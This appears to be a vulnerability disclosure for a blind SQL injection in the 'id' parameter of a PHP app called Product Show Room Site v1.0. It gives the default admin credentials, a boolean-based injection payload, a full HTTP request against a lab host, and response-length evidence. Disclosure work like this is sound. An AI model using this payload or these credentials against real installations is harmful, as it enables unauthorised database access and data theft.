# Product Show Room Site v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15370/product-show-room-site-phpoop-free-source-code.html

Vulnerability File: /psrs/admin/fields/manage_field.php?id=

Vulnerability location: /psrs/admin/fields/manage_field.php?id=, id

Current database name: hsrs_db ,length is 7

[+] Payload: /psrs/admin/fields/manage_field.php?id=1%27%20and%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /psrs/admin/fields/manage_field.php?id=1%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1
Connection: close
```

When length (database ()) = 6, Content-Length: 2889
![image](https://user-images.githubusercontent.com/54017627/171830272-2cee4f44-c3cc-40a8-b5b6-ee96ee6f6ed0.png)

![image](https://user-images.githubusercontent.com/54017627/171830332-9e7a33d7-15fd-427d-816a-cf2c3a827fb5.png)

When length (database ()) = 7, Content-Length: 2906
![image](https://user-images.githubusercontent.com/54017627/171830233-bab5f730-b2d9-4826-b462-62e3510d1895.png)

![image](https://user-images.githubusercontent.com/54017627/171830297-db8b0e21-bd63-40ef-97ff-d4cd1a7bbac3.png)
